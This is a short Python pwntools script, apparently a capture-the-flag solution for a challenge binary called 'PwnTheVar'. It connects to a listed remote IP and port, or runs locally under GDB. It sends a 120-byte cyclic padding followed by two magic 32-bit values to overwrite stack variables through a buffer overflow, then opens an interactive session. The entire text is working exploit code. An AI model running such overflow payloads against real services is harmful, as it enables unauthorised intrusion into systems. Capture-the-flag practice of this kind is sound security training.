from pwn import *

gs = '''
b *main+79
continue
'''

elf = context.binary = ELF("./PwnTheVar")

def start():
    if args.REMOTE:
        return remote("54.224.65.7", 33333)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

io.sendline(cyclic(120) + p32(0xc0d3b4b3) + p32(0xb4adbeef))

io.interactive()
